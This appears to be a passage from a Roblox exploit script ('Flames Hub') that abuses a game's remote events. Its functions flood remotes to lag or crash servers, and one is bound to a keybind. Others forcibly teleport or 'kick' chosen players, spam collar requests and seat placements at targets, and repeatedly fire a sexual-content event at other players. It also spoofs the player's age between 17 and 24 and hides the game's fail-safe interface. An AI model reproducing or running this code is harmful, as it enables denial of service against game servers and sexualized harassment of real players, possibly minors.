			getgenv().notify("Info", "Play Animation Remote is a RemoteEvent, trying anyway...", 7)
			task.wait(0.1)
			local ok, err = pcall(function()
				Play_Anim:FireServer(Animation, TheyreCharacter)
			end)
			if not ok then
				return getgenv().notify("Error", "FireServer failed: "..tostring(err), 6)
			end
		end
	end
end

function respawn_at_current_location()
    local LocalPlayer = getgenv().LocalPlayer
    local Character = LocalPlayer.Character
    local hrp = getgenv().HumanoidRootPart or Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart", 1)

    if not hrp then
        return getgenv().notify("Error", "HumanoidRootPart not found.", 5)
    end

    if not Char_User_RE and not res_remote and not Respawn_Remote then
        return getgenv().notify("Error", "No valid respawn remote found.", 5)
    end

    local saved_cf = hrp.CFrame

    local function snapshot()
        local char = LocalPlayer.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        return {
            character = char,
            root = char and char:FindFirstChild("HumanoidRootPart"),
            health = hum and hum.Health
        }
    end

    local function fire_and_check(remote, arg)
        local before = snapshot()

        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                if arg ~= nil then
                    remote:InvokeServer(arg)
                else
                    remote:InvokeServer()
                end
            else
                if arg ~= nil then
                    remote:FireServer(arg)
                else
                    remote:FireServer()
                end
            end
        end)

        if not ok then
            return false
        end

        task.wait(0.6)

        local after = snapshot()

        if before.character ~= after.character then
            return true
        end

        if before.root ~= after.root then
            return true
        end

        if before.health ~= after.health then
            return true
        end

        return false
    end

    local respawned = false

    if Char_User_RE then
        respawned = fire_and_check(Char_User_RE, tostring(LocalPlayer.Name))
    end

    if not respawned and res_remote then
        local pos = vector.create(saved_cf.X, saved_cf.Y, saved_cf.Z)
        respawned = fire_and_check(res_remote, pos)
    end

    if not respawned and Respawn_Remote then
        respawned = fire_and_check(Respawn_Remote)
    end

    if not respawned then
        return getgenv().notify("Error", "Respawn attempt failed or was rejected.", 6)
    end

    local new_char = getgenv().Character or LocalPlayer.Character
    local new_hrp = new_char:WaitForChild("HumanoidRootPart", 3)

    if not new_hrp then
        return getgenv().notify("Error", "Respawned but HRP not found.", 5)
    end

    new_hrp.CFrame = saved_cf
    getgenv().notify("Success", "Respawn confirmed and position restored.", 5)
end

function give_all_gears()
    if Catalog_Remote and Catalog_Remote:IsA("RemoteEvent") then
        for _, id in ipairs(gearIDs) do
            pcall(function() Catalog_Remote:FireServer(id) end)
        end
    end
end

getgenv().collar_whitelist = getgenv().collar_whitelist or {}
getgenv().spam_requesting_collared_plr = getgenv().spam_requesting_collared_plr or false
getgenv().currently_tasked_spawned_collar_player_loop = getgenv().currently_tasked_spawned_collar_player_loop or nil
getgenv().collar_whitelist_guard_init = getgenv().collar_whitelist_guard_init or false
getgenv().collar_whitelist_purge_init = getgenv().collar_whitelist_purge_init or false

function validate_collar_whitelist()
    local count = 0
    for plr in next, getgenv().collar_whitelist do
        if not plr or not plr.Parent then
            getgenv().collar_whitelist[plr] = nil
        else
            count = count + 1
            if count > 2 then
                getgenv().collar_whitelist[plr] = nil
            end
        end
    end

    if next(getgenv().collar_whitelist) == nil then
        if getgenv().spam_requesting_collared_plr then
            getgenv().spam_requesting_collared_plr = false
            getgenv().currently_tasked_spawned_collar_player_loop = nil
        end
    end
end

function whitelist_collar_player(plr_or_name)
    if not plr_or_name then return end
    validate_collar_whitelist()

    local plr
    if typeof(plr_or_name) == "Instance" and plr_or_name:IsA("Player") then
        plr = plr_or_name
    elseif typeof(plr_or_name) == "string" then
        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
            if p.Name == plr_or_name or p.DisplayName == plr_or_name then
                plr = p
                break
            end
        end
    end

    if not plr then return end

    if getgenv().collar_whitelist[plr] then
        return notify("Warning", "This player is already whitelisted.", 5)
    end

    local count = 0
    for _ in next, getgenv().collar_whitelist do
        count = count + 1
    end

    if count >= 2 then
        return notify("Error", "Whitelist limit reached (2).", 5)
    end

    getgenv().collar_whitelist[plr] = true
    getgenv().notify("Success", "Player has been added to the Collar Request Whitelist: "..tostring(plr.Name), 8)
end

function unwhitelist_collar_player(plr)
    if not plr then return end
    if not getgenv().collar_whitelist[plr] then
        return notify("Warning", "This player isn't whitelisted.", 5)
    end

    getgenv().collar_whitelist[plr] = nil
    getgenv().notify("Success", "Player has been removed from the Collar Request Whitelist: "..tostring(plr.Name), 8)
    validate_collar_whitelist()
end

function has_whitelisted_collar_players()
    local t = getgenv().collar_whitelist
    if not t then return false end
    return next(t) ~= nil
end

if not getgenv().collar_whitelist_purge_init then
    getgenv().collar_whitelist_purge_init = true

    Players.PlayerRemoving:Connect(function(plr)
        local real_player = plr

        if getgenv().collar_whitelist and getgenv().collar_whitelist[real_player] then
            getgenv().collar_whitelist[real_player] = nil
        end
    end)
end

function stop_collar_spam_loop()
    getgenv().spam_requesting_collared_plr = false

    local t = getgenv().currently_tasked_spawned_collar_player_loop
    if t then
        pcall(task.cancel, t)
        getgenv().currently_tasked_spawned_collar_player_loop = nil
    end
end

function spam_request_collar_plr(looped)
    if not Send_Request_RE then return notify("Warning", "No SendRequest RemoteEvent found.", 5) end
    if not Send_Request_RE:IsA("RemoteEvent") then return notify("Error", "SendRequest found, but it is not a RemoteEvent.", 5) end

    if looped then
        if getgenv().spam_requesting_collared_plr then return end

        stop_collar_spam_loop()
        wait()
        getgenv().spam_requesting_collared_plr = true
        getgenv().currently_tasked_spawned_collar_player_loop = task.spawn(function()
            while getgenv().spam_requesting_collared_plr == true do
                validate_collar_whitelist()

                if next(getgenv().collar_whitelist) == nil then
                    getgenv().spam_requesting_collared_plr = false
                    getgenv().SpamCollarRequestPlr_FE_Toggle:Set(false)
                    notify("Info", "Collar spam loop stopped (whitelist empty).", 5)
                    break
                end

                for plr in next, getgenv().collar_whitelist do
                    if not getgenv().spam_requesting_collared_plr then break end

                    if plr and plr.Parent then
                        Send_Request_RE:FireServer(plr)
                        task.wait(0)
                    else
                        getgenv().collar_whitelist[plr] = nil
                    end
                end
                task.wait(0)
            end

            getgenv().currently_tasked_spawned_collar_player_loop = nil
        end)

        notify("Info", "Collar spam loop started.", 5)
    else
        getgenv().spam_requesting_collared_plr = false
        getgenv().currently_tasked_spawned_collar_player_loop = nil
        notify("Info", "Collar spam loop stopped.", 5)
    end
end

function spam_RF(PacketAmount, Remote, Loop, ...)
    if Loop == true then
        getgenv().Spamming_Packets_RF = true
        while getgenv().Spamming_Packets_RF == true do
        wait()
            Remote:InvokeServer(...)
        end
    elseif Loop == false then
        for i = 1, PacketAmount do
            Remote:InvokeServer(...)
        end
    else
        return 
    end
end
task.wait(0.2)
local Lag_Server_Power = 200
task.wait(0.1)
function lag_server_FE()
    if res_remote and res_remote:IsA("RemoteEvent") then
        local pos = HumanoidRootPart.Position
        local args = {
            vector.create(pos.X, pos.Y, pos.Z)
        }

        spam_RE(Lag_Server_Power, res_remote, false, args)
    else
        return getgenv().notify("Error", "RemoteEvent not found or is not a RemoteEvent.", 10)
    end
end

local function get_chat_remote()
    if getgenv().Chat_Remote_Event then
        return getgenv().Chat_Remote_Event
    end

    local reps = getgenv().ReplicatedStorage or game:GetService("ReplicatedStorage")
    if not reps then return nil end

    local possible_names = {"chat", "chatevent", "message", "sendmessage", "sendchat", "chat_event"}

    for _, descendant in ipairs(reps:GetChildren()) do
        if descendant:IsA("RemoteEvent") then
            for _, name in ipairs(possible_names) do
                if descendant.Name:lower() == name:lower() then
                    getgenv().Chat_Remote_Event = descendant
                    return descendant
                end
            end
        end
    end

    return nil
end

local function get_typing_indicator_remote()
    if getgenv().Typing_Indicator_Remote_Event then
        return getgenv().Typing_Indicator_Remote_Event
    end

    local reps = getgenv().ReplicatedStorage or game:GetService("ReplicatedStorage")
    if not reps then return nil end

    local possible_names = {"typing", "typingindicator", "typing indicator", "typing_indicator"}

    for _, descendant in ipairs(reps:GetChildren()) do
        if descendant:IsA("RemoteEvent") then
            for _, name in ipairs(possible_names) do
                if descendant.Name:lower() == name:lower() then
                    getgenv().Typing_Indicator_Remote_Event = descendant
                    return descendant
                end
            end
        end
    end

    return nil
end

get_chat_remote()
get_typing_indicator_remote()

function send_chat_message(text)
    local main_arg = tostring(text)

    local args = {
        {
            Text = tostring(text),
            Title = "",
            Type = "All"
        }
    }

    if getgenv().Chat_Remote_Event and getgenv().Chat_Remote_Event:IsA("RemoteEvent") then
        getgenv().Chat_Remote_Event:FireServer(unpack(args))
    end
end

local function get_age_remote()
    for _, v in ipairs(getgenv().ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("set") and v.Name:lower():find("movement") then
            return v
        elseif v:IsA("RemoteEvent") and v.Name:lower():find("set") and v.Name:lower():find("information") then
            return v
        end
    end
    
    return nil
end

getgenv().cached_age_remote = getgenv().cached_age_remote or get_age_remote()

function change_age(new_number_age)
    local age_remote_found = getgenv().cached_age_remote
    if not age_remote_found then
        return getgenv().notify("Error", "Age RemoteEvent not found.", 5)
    end
    if new_number_age < 17 or new_number_age > 24 then
        new_number_age = 18
    end

    if getgenv().cached_age_remote.Name:lower():find("movement") then
        local args = {
            "\240\159\141\175",
            tonumber(new_number_age) or math.random(17, 24)
        }
        age_remote_found:FireServer(unpack(args))
    elseif getgenv().cached_age_remote.Name:lower():find("information") then
        local args = {
            "\226\153\130\239\184\143",
            tonumber(new_number_age) or math.random(17, 24)
        }
        age_remote_found:FireServer(unpack(args))
    end
end

function loop_edit_age(toggled)
    if toggled == true then
        getgenv().changing_age = true
        getgenv().changing_age_loop_task = task.spawn(function()
            while getgenv().changing_age == true do
            task.wait(0)
                change_age(math.random(17, 24))
            end
        end)
    elseif toggled == false then
        getgenv().changing_age = false
        wait(0.1)
        if getgenv().changing_age_loop_task then
            pcall(function()
                task.cancel(getgenv().changing_age_loop_task)
                getgenv().changing_age_loop_task = nil
            end)
        end
    else
        return 
    end
end

if not getgenv().never_showing_typing_indication then
    if getgenv().Typing_Indicator_Remote_Event and getgenv().Typing_Indicator_Remote_Event:IsA("RemoteEvent") then
        getgenv().never_showing_typing_indication = true

        task.spawn(function()
            while getgenv().never_showing_typing_indication == true do
            task.wait(0)
                getgenv().Typing_Indicator_Remote_Event:FireServer(false)
            end
        end)
    end
end

local function get_seats_folder()
    for _, v in ipairs(getgenv().Workspace:GetChildren()) do
        if v:IsA("Folder") and v.Name:lower():find("seat") then
            return v
        end
    end

    return nil
end

local function get_tool(to_find_here)
    if not to_find_here then return nil end

    for _, v in ipairs(to_find_here:GetChildren()) do
        if v.Name:lower():find("seat") and v.Name:lower():find("spawner") then
            return v
        end
    end

    return nil
end

function delete_seat(model)
    if not model then
        getgenv().planting_seat_on_player = false
        return 
    end
    local seats_folder_main = get_seats_folder()
    if not seats_folder_main then
        getgenv().planting_seat_on_player = false
        return getgenv().notify("Error", "Seats Folder not found inside Workspace.", 5) 
    end
    if typeof(model) ~= "Instance" or not model:IsA("Model") then
        getgenv().planting_seat_on_player = false
        return getgenv().notify("Error", "You have provided an invalid Model (object provided is not a Model).", 10)
    end
    local tool_main

    if get_tool(Backpack) then
        tool_main = get_tool(Backpack)
    elseif get_tool(Character) then
        tool_main = get_tool(Character)
    end

    if not tool_main then
        getgenv().planting_seat_on_player = false
        return getgenv().notify("Error", "Seat spawner tool not found.", 5)
    end

    local args = {
        true,
        model
    }

    local spawn
    local backpack_tool = get_tool(Backpack)
    local character_tool = get_tool(Character)

    if backpack_tool then
        spawn = backpack_tool:FindFirstChild("Spawn")
    end
    if not spawn and character_tool then
        spawn = character_tool:FindFirstChild("Spawn")
    end
end

function plant_seat_on_plr(player)
    local target_root = getgenv().get_root(player)
    if not target_root then return end

    local seats_folder_ws = get_seats_folder()
    if not seats_folder_ws then
        getgenv().planting_seat_on_player = false
        return getgenv().notify("Error", "Seats Folder does not exist in Workspace.", 5)
    end

    local backpack_tool = get_tool(Backpack)
    local character_tool = get_tool(Character)
    local tool = backpack_tool or character_tool
    if not tool then return end
    local spawn = tool:FindFirstChild("Spawn")
    if not spawn then return end

    local args = {
        false,
        CFrame.new(target_root.Position + Vector3.new(0, 0, 1))
    }

    if spawn:IsA("RemoteEvent") then
        spawn:FireServer(unpack(args))
    elseif spawn:IsA("RemoteFunction") then
        spawn:InvokeServer(unpack(args))
    end
    task.wait(.1)
    local seat = seats_folder_ws:FindFirstChild("Seat")
    if seat and seat:IsA("Model") then
        delete_seat(seat)
    end
end

getgenv().fully_turn_off_fail_safe_main_gui = true
getgenv().main_screengui_menu_enabled_loop = true
getgenv().enabled_settings_on_loop_toggled = true

local function get_settings_main_menu_with_TPs()
    for _, v in ipairs(getgenv().PlayerGui:GetChildren()) do
        if v:IsA("ScreenGui") and v.Name:lower():find("settings") then
            return v
        end
    end
end

local function get_fail_safe_gui()
    local cached = getgenv().Fail_Safe_Main_GUI_Collected
    if cached and cached:IsA("ScreenGui") then
        return cached
    end

    for _, v in ipairs(getgenv().PlayerGui:GetDescendants()) do
        if v:IsA("ScreenGui") then
            local name = v.Name:lower()
            if name:find("fail") and name:find("safe") then
                getgenv().Fail_Safe_Main_GUI_Collected = v
                return v
            end
        end
    end

    return nil
end

local function get_main_menu_gui()
    local cached = getgenv().Main_Menu_ScreenGui_Collected
    if cached and cached:IsA("ScreenGui") then
        return cached
    end

    for _, v in ipairs(getgenv().PlayerGui:GetDescendants()) do
        if v:IsA("ScreenGui") and v.Name:lower():find("menu") then
            getgenv().Main_Menu_ScreenGui_Collected = v
            return v
        end
    end

    return nil
end

local function get_blow_load_event()
    local cached = getgenv().Blow_Cum_Remote_Event_Cached
    if cached and cached:IsA("RemoteEvent") then
        return cached
    end

    for _, v in ipairs(getgenv().ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("cum") and v.Name:lower():find("event") then
            getgenv().Blow_Cum_Remote_Event_Cached = v
            return v
        end
    end

    return nil
end
wait(0.2)
getgenv().fire_event_with_cf = function(cf, vec)
    local main_remote = getgenv().Blow_Cum_Remote_Event_Cached or get_blow_load_event()
    if not (main_remote and main_remote:IsA("RemoteEvent")) then return end

    local args = {
        cf,
        vec,
        (function(param)
            param.FilterDescendantsInstances = {getgenv().Character}
            param.RespectCanCollide = true
            return param
        end)(RaycastParams.new())
    }

    main_remote:FireServer(unpack(args))
end

getgenv().splash_all_over_player_count = function(cf, vec, times)
    local main_remote = getgenv().Blow_Cum_Remote_Event_Cached or get_blow_load_event()
    local amount = tonumber(times) or 5
    if not (main_remote and main_remote:IsA("RemoteEvent")) then return end

    for i = 1, amount do
        task.wait()
        local args1 = {
            cf,
            vec,
            (function(param)
                param.FilterDescendantsInstances = {getgenv().Character}
                param.RespectCanCollide = false
                return param
            end)(RaycastParams.new())
        }

        main_remote:FireServer(unpack(args1))
        task.wait(0)
        local args2 = {
            cf,
            vec,
            (function(param)
                param.FilterDescendantsInstances = {getgenv().Character}
                param.RespectCanCollide = true
                return param
            end)(RaycastParams.new())
        }

        main_remote:FireServer(unpack(args2))
    end
end

getgenv().splash_whitelist_all_count_whitelisted_players = function(times)
    local wl = getgenv().CummingOnPlayersWhitelistSystem
    if not wl or next(wl) == nil then return end
    local main_remote = getgenv().Blow_Cum_Remote_Event_Cached or get_blow_load_event()
    if not (main_remote and main_remote:IsA("RemoteEvent")) then return end
    local amount = tonumber(times) or 5

    for i = 1, amount do
        for uid, _ in pairs(wl) do
            local plr = game.Players:GetPlayerByUserId(uid)
            if not plr then print(".") end

            local char = return_char(plr, 30)
            if not char then print(".") end

            local root = get_root_with_timeout(plr, 30)
            if not root then print(".") end

            local cf = root.CFrame
            local v = root.AssemblyLinearVelocity or root.Velocity
            local vec = vector.create(v.X, v.Y, v.Z)

            local args1 = {
                cf,
                vec,
                (function(param)
                    param.FilterDescendantsInstances = {getgenv().Character}
                    param.RespectCanCollide = false
                    return param
                end)(RaycastParams.new())
            }
            main_remote:FireServer(unpack(args1))

            task.wait(0)

            local args2 = {
                cf,
                vec,
                (function(param)
                    param.FilterDescendantsInstances = {getgenv().Character}
                    param.RespectCanCollide = true
                    return param
                end)(RaycastParams.new())
            }
            main_remote:FireServer(unpack(args2))

            task.wait(0)
        end
        task.wait(0.1) -- small delay between each repeat
    end
end

getgenv().splashing_all_over_this_player_on_repeat = function(state, plr)
    if not plr or not getgenv().Players:FindFirstChild(plr.Name) then
        return getgenv().notify("Error", "That player does not exist.", 5)
    end

    if state and getgenv().splash_loop == true then
        if getgenv().notify then
            getgenv().notify("Warning", "This loop is already running, turn it off first.", 6)
        end
        return
    end
    wait(0.1)
    getgenv().splash_loop = state
    if not state then return end

    local main_remote = getgenv().Blow_Cum_Remote_Event_Cached or get_blow_load_event()
    if not (main_remote and main_remote:IsA("RemoteEvent")) then return getgenv().notify("Error", "Could not find CumEvent or CumEvent is not a RemoteEvent.", 6) end

    while getgenv().splash_loop == true do
        local root = g.get_root(plr, 3)
        if not root then
            task.wait()
            print(".")
        end

        local cf = root.CFrame
        local vec = root.Velocity
        local args1 = {
            cf,
            vec,
            (function(param)
                param.FilterDescendantsInstances = {getgenv().Character}
                param.RespectCanCollide = false
                return param
            end)(RaycastParams.new())
        }
        main_remote:FireServer(unpack(args1))
        task.wait(0)
        local args2 = {
            cf,
            vec,
            (function(param)
                param.FilterDescendantsInstances = {getgenv().Character}
                param.RespectCanCollide = true
                return param
            end)(RaycastParams.new())
        }
        main_remote:FireServer(unpack(args2))
        task.wait(0)
    end
end

getgenv().cum_on_whitelisted_players_loop = function(state)
    local wl = getgenv().CummingOnPlayersWhitelistSystem
    if not wl or next(wl) == nil then return end

    if state and getgenv().cum_loop_active == true then
        if getgenv().notify then
            getgenv().notify("Warning", "This loop is already running, turn it off first.", 6)
        end
        return
    end

    task.wait(0.1)
    getgenv().cum_loop_active = state
    if not state then return end

    local main_remote = getgenv().Blow_Cum_Remote_Event_Cached or get_blow_load_event()
    if not (main_remote and main_remote:IsA("RemoteEvent")) then
        return getgenv().notify("Error", "Could not find CumEvent or CumEvent is not a RemoteEvent.", 6)
    end

    while getgenv().cum_loop_active == true do
        for uid, _ in pairs(wl) do
            local plr = game.Players:GetPlayerByUserId(uid)
            if not plr then print(".") end

            local char = return_char(plr, 30)
            if not char then print(".") end

            local root = get_root_with_timeout(plr, 30)
            if not root then print(".") end

            local cf = root.CFrame
            local v = root.AssemblyLinearVelocity or root.Velocity
            local vec = vector.create(v.X, v.Y, v.Z)

            local args1 = {
                cf,
                vec,
                (function(param)
                    param.FilterDescendantsInstances = {getgenv().Character}
                    param.RespectCanCollide = false
                    return param
                end)(RaycastParams.new())
            }
            main_remote:FireServer(unpack(args1))
            task.wait(0)
            local args2 = {
                cf,
                vec,
                (function(param)
                    param.FilterDescendantsInstances = {getgenv().Character}
                    param.RespectCanCollide = true
                    return param
                end)(RaycastParams.new())
            }
            main_remote:FireServer(unpack(args2))

            task.wait(0)
        end
        task.wait(.1)
    end
end

task.spawn(function()
    while getgenv().fully_turn_off_fail_safe_main_gui == true do
        task.wait()
        local gui = get_fail_safe_gui()
        if gui then
            gui.Enabled = false
        end
    end
end)

task.spawn(function()
    while getgenv().main_screengui_menu_enabled_loop == true do
        task.wait()
        local gui = get_main_menu_gui()
        if gui then
            gui.Enabled = true
        end
    end
end)

task.spawn(function()
    while getgenv().enabled_settings_on_loop_toggled == true do
        task.wait()
        local gui = get_settings_main_menu_with_TPs()
        if gui then
            gui.Enabled = true
        end
    end
end)

getgenv().toggle_brightness_functionality = function(state)
    if state then
        getgenv().toggling_so_bright_function = true
        while getgenv().toggling_so_bright_function == true do
        task.wait(0.2)
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("PointLight") then
                    v.Enabled = true
                end
            end
        end
    else
        getgenv().toggling_so_bright_function = false
        getgenv().wait_for_disabled(function()
            return getgenv().toggling_so_bright_function
        end, 5)

        if not getgenv().toggling_so_bright_function then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("PointLight") then
                    v.Enabled = false
                end
            end
        end
    end
end

function loop_plant_seat_on_plr(toggled, player)
    if toggled == true then
        if not player then
            getgenv().planting_seat_on_player = false
            return 
        end

        getgenv().planting_seat_on_player = true
        task.spawn(function()
            while getgenv().planting_seat_on_player == true do
            task.wait(.1)
                plant_seat_on_plr(player)
            end
        end)
    else
        getgenv().planting_seat_on_player = false
    end
end

function stop_loop_sitting_plr()
    getgenv().planting_seat_on_player = false
    wait(1)
    if getgenv().planting_seat_on_player then -- still enabled for some reason (maybe lag?).
        getgenv().planting_seat_on_player = false
        task.wait(0.2)
        for i = 1, 3 do
            getgenv().planting_seat_on_player = false
        end
    end
end

function crash_server_overpowered()
    if typeof(res_remote) ~= "Instance" or not res_remote:IsA("RemoteEvent") then
        getgenv().crashing_server_toggle = false
        getgenv().crashing_server_toggle_overpowered = false
        return getgenv().notify("Error", "RemoteEvent does not exist or is not a RemoteEvent.", 7)
    end
    if getgenv().crashing_server_toggle_overpowered then return end

    getgenv().crashing_server_toggle_overpowered = true
    while getgenv().crashing_server_toggle_overpowered == true do
    task.wait()
        local pos = HumanoidRootPart.Position
        local args = {
            vector.create(pos.X, pos.Y, pos.Z)
        }

        spam_RE(100, res_remote, false, args)
        spam_RE(300, res_remote, false, args)
        spam_RE(100, res_remote, false, args)
        spam_RE(300, res_remote, false, args)
    end
end

getgenv().key_code_to_end_server = getgenv().key_code_to_end_server or Enum.KeyCode.F
wait(0.2)
if not getgenv().Already_Set_Flames_Hub_Keybind_Active_State then
    getgenv().Already_Set_Flames_Hub_Keybind_Active_State = true

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == getgenv().key_code_to_end_server then
            if getgenv().flames_hub_crasher_keybind_active == true then
                if typeof(crash_server) == "function" then crash_server() end
            end
        end
    end)
end
wait(0.1)
function force_sync_plr(Player)
    if Sync_Player_RE and Sync_Player_RE:IsA("RemoteEvent") then
        getgenv().notify("Info", "Syncing you with: "..tostring(Player).."...", 5)
        local args = {
            Player
        }

        Sync_Player_RE:FireServer(unpack(args))
        wait(0.2)
        getgenv().notify("Success", "You should now be forcefully synced with: "..tostring(Player).." (you can change their animation speed and stuff).", 11)
    else
        return getgenv().notify("Error", "RemoteEvent was not found or is not a RemoteEvent.", 8)
    end
end

getgenv().find_teleport_maps_event = function()
    local cached = getgenv().Teleport_Event_Orig_RE_Found
    if cached and cached:IsA("RemoteEvent") then
        return cached
    end

    for _, v in ipairs(getgenv().ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("teleport") and v.Name:lower():find("event") then
            getgenv().Teleport_Event_Orig_RE_Found = v
            return v
        end
    end
    
    return nil
end

getgenv().find_bring_plr_event = function()
    local cached = getgenv().Bring_Player_Original_RE_Found
    if cached and cached:IsA("RemoteEvent") then
        return cached
    end

    for _, v in ipairs(getgenv().ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("bring") and v.Name:lower():find("player") and v.Name:lower():find("event") then
            getgenv().Bring_Player_Original_RE_Found = v
            return v
        end
    end
    
    return nil
end

getgenv().bring_plr_main_tbl_whitelist = getgenv().bring_plr_main_tbl_whitelist or {}
getgenv().bring_cycle_active = false
getgenv().bring_cycle_running = false
wait(0.1)
local function whitelist_has_players()
    return next(getgenv().bring_plr_main_tbl_whitelist) ~= nil
end
wait(0.1)
getgenv().kick_player_firing_func = function()
    if getgenv().bring_cycle_running then
        getgenv().bring_cycle_running = false
        return getgenv().notify("Info", "Bring cycle stopped", 5)
    end

    if not next(getgenv().bring_plr_main_tbl_whitelist) then
        return getgenv().notify("Warning", "Whitelist is empty", 5)
    end

    getgenv().bring_cycle_running = true

    local bring_plr_RE = getgenv().Bring_Player_Original_RE_Found or getgenv().find_bring_plr_event()
    if not bring_plr_RE then
        getgenv().bring_cycle_running = false
        return getgenv().notify("Error", "Could not find BringPlayerEvent (patched?).", 6)
    end

    local teleport_event = getgenv().find_teleport_maps_event and getgenv().find_teleport_maps_event()
    if not teleport_event then
        getgenv().bring_cycle_running = false
        return getgenv().notify("Error", "Could not find TeleportEvent (patched?).", 6)
    end

    local teleport_maps = {
        "Apartment #1",
        "Apartment #2",
        "Attic",
        "Attic #2",
        "Bar (Club)",
        "Beach",
        "Cafe",
        "Japanese House",
        "CyberRoom"
    }

    task.spawn(function()
        while getgenv().bring_cycle_running == true do
            for _, map_name in ipairs(teleport_maps) do
                if not getgenv().bring_cycle_running then
                    break
                end

                pcall(function()
                    teleport_event:FireServer(map_name)
                end)
                wait()
                task.wait(0)
                for _, plr_name in ipairs(getgenv().bring_plr_main_tbl_whitelist) do
                    local plr = getgenv().Players:FindFirstChild(plr_name)
                    if plr then
                        pcall(function()
                            bring_plr_RE:FireServer(plr)
                        end)
                    end
                end
                task.wait(0)
                wait()
            end
        end
    end)

    getgenv().notify("Success", "Bring cycle started", 5)
end

getgenv().kick_firing_function_toggle = function()
    local toggle = getgenv().BringAll_ToYou_FE_Toggle

    if getgenv().bring_cycle_active then
        getgenv().bring_cycle_active = false
        if toggle and toggle.Set then
            toggle:Set(false)
        end
        return getgenv().notify("Info", "Bring cycle has been stopped.", 5)
    end

    if not getgenv().bring_plr_main_tbl_whitelist or not next(getgenv().bring_plr_main_tbl_whitelist) then
        if toggle and toggle.Set then
            getgenv().bring_cycle_active = false
            toggle:Set(false)
        end
        return getgenv().notify("Warning", "Whitelist is empty.", 5)
    end

    local bring_plr_re = getgenv().Bring_Player_Original_RE_Found or getgenv().find_bring_plr_event()
    if not bring_plr_re then
        if toggle and toggle.Set then
            getgenv().bring_cycle_active = false
            toggle:Set(false)
        end
        return getgenv().notify("Error", "Could not find BringPlayerEvent (patched?).", 6)
    end

    getgenv().bring_cycle_active = true

    task.spawn(function()
        while getgenv().bring_cycle_active == true do
            if not getgenv().bring_plr_main_tbl_whitelist or not next(getgenv().bring_plr_main_tbl_whitelist) then
                getgenv().bring_cycle_active = false
                if toggle and toggle.Set then
                    toggle:Set(false)
                end
                getgenv().notify("Warning", "Whitelist became empty. Cycle stopped.", 5)
                break
            end

            for _, plr_name in ipairs(getgenv().bring_plr_main_tbl_whitelist) do
                if not getgenv().bring_cycle_active then
                    break
                end

                local plr = getgenv().Players:FindFirstChild(plr_name)
                if plr then
                    pcall(function()
                        bring_plr_re:FireServer(plr)
                    end)
                end

                task.wait(0.1)
            end
        end
    end)

    getgenv().notify("Success", "Bring cycle started (no teleport).", 5)
end

getgenv().single_bring_cycle_running = false
getgenv().single_bring_target = nil
wait(0.1)
getgenv().bring_loop_kick_plr_singular = function(player_name, fire_count)
    fire_count = tonumber(fire_count) or 5

    if typeof(player_name) ~= "string" then
        return getgenv().notify("Error", "Invalid player name", 5)
    end

    if not table.find(getgenv().bring_plr_main_tbl_whitelist, player_name) then
        return getgenv().notify("Warning", "Player is not whitelisted", 5)
    end

    local plr = getgenv().Players:FindFirstChild(player_name)
    if not plr then
        return getgenv().notify("Error", "Player not found", 5)
    end

    local bring_plr_RE = getgenv().Bring_Player_Original_RE_Found or getgenv().find_bring_plr_event()
    if not bring_plr_RE then
        return getgenv().notify("Error", "Could not find BringPlayerEvent (patched?).", 6)
    end

    local teleport_event = getgenv().find_teleport_maps_event and getgenv().find_teleport_maps_event()
    if not teleport_event then
        return getgenv().notify("Error", "Could not find TeleportEvent (patched?).", 6)
    end

    local teleport_maps = {
        "Apartment #1",
        "Apartment #2",
        "Attic",
        "Attic #2",
        "Bar (Club)",
        "Beach",
        "Cafe",
        "Japanese House",
        "CyberRoom"
    }

    task.spawn(function()
        for i = 1, fire_count do
            local map_name = teleport_maps[((i - 1) % #teleport_maps) + 1]

            pcall(function()
                teleport_event:FireServer(map_name)
            end)
            task.wait(0.25)
            local target = getgenv().Players:FindFirstChild(player_name)
            if not target then
                return
            end

            pcall(function()
                bring_plr_RE:FireServer(target)
            end)
            task.wait(0.25)
        end
    end)

    getgenv().notify("Success", "Burst bring fired for " .. player_name .. " (" .. fire_count .. " times)", 5)
end

getgenv().extract_key_name = function(keycode)
    if typeof(keycode) == "EnumItem" then
        return keycode.Name
    end
    return nil
end

local keybind_letter = getgenv().extract_key_name(getgenv().key_code_to_end_server)

function afk_toggle(boolean)
    if not Load_Event then
        getgenv().spamming_afk_enabled = false
    end

    if boolean == true then
        if Load_Event and Load_Event:IsA("RemoteEvent") then
            Load_Event:FireServer(true)
        end
    elseif boolean == false then
        if Load_Event and Load_Event:IsA("RemoteEvent") then
            Load_Event:FireServer(false)
        end
    else
        return 
    end
end

function spam_afk(toggle)
    if toggle == true then
        getgenv().spamming_afk_enabled = true
        while getgenv().spamming_afk_enabled == true do
        task.wait()
            afk_toggle(true)
            task.wait(0)
            afk_toggle(false)
        end
    elseif toggle == false then
        getgenv().spamming_afk_enabled = false
        task.wait(0.5)
        afk_toggle(false)
    else
        return 
    end
end

getgenv().chatWhitelist = getgenv().chatWhitelist or {}
getgenv().addChatWhitelist = function(player)
    if typeof(player) ~= "Instance" then return false end
    if not player:IsA("Player") then return false end

    local uid = player.UserId
    if getgenv().chatWhitelist[uid] then
        return false
    end

    getgenv().chatWhitelist[uid] = true
    getgenv().notify("Success", "The player has been added to the whitelist.", 5)
    return true
end

getgenv().removeChatWhitelist = function(playerOrUserId)
    local uid

    if typeof(playerOrUserId) == "Instance" and playerOrUserId:IsA("Player") then
        uid = playerOrUserId.UserId
    elseif typeof(playerOrUserId) == "number" then
        uid = playerOrUserId
    else
        return false
    end

    if not getgenv().chatWhitelist[uid] then
        return false
    end

    getgenv().chatWhitelist[uid] = nil
    getgenv().notify("Success", "The player has been removed from the whitelist.", 5)
    return true
end

local http_requesting = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
local httpreq = http_requesting

